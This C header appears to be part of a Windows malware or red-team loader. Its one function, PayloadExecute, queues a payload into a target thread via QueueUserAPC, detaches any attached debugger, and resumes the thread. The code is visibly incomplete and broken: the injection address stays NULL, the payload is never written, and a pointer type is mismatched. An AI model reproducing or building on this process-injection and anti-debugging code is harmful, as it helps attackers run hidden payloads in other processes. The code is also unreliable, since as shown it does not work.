# pragma once
#include "api.h"
#include <stdio.h>
#include <Windows.h>

BOOL PayloadExecute( IN OPTIONAL HANDLE hProcess, IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PBYTE* ppInjectionAddress, OUT OPTIONAL HANDLE* phThread) {

	PVOID pAddress = NULL;
	DWORD dwOldProtection = NULL;
    PBOOL bDebuggerPresent = NULL;

	// If hThread is in an alertable state, QueueUserAPC will run the payload directly
	// If hThread is in a suspended state, the payload won't be executed unless the thread is resumed after
	if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
		printf("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

    if (CheckRemoteDebuggerPresent(hProcess, &bDebuggerPresent)) {
        if (!DebugActiveProcessStop(GetProcessId(hProcess))) {
            printf("[!] DebugActiveProcessStop Failed With Error: %d \n", GetLastError());
            return FALSE;
        }}

    else {
        if(pResumeThread(hThread) == ((DWORD)-1)){
            printf("[!] ResumeThread Failed With Error : %d \n", GetLastError());
            return FALSE;
        }
    }

    // Just for testing purposes (TO REMOVE)
    WaitForSingleObject(hThread, INFINITE);
	return TRUE;
}